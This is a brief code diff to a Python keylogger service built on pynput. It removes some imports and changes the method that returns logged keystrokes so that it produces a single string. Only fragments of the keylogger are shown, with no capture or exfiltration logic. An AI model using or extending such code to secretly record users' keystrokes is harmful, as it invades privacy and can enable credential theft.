@@ -1,6 +1,4 @@
-from abc import ABC, abstractmethod
-from typing import List
-from KeyLoggerAgent import Listener,logged_keys
+﻿from abc import ABC, abstractmethod
 from pynput.keyboard import Key, KeyCode, Listener
 import time
 
@@ -70,7 +68,7 @@ class KeyLoggerService(IKeyLogger):
         self.listener.stop()
 
     def get_logged_keys(self):
-        return list(self.logged_keys)
+        return "".join(c for c in self.logged_keys if c is not None)
 
 
 if __name__ == "__main__":
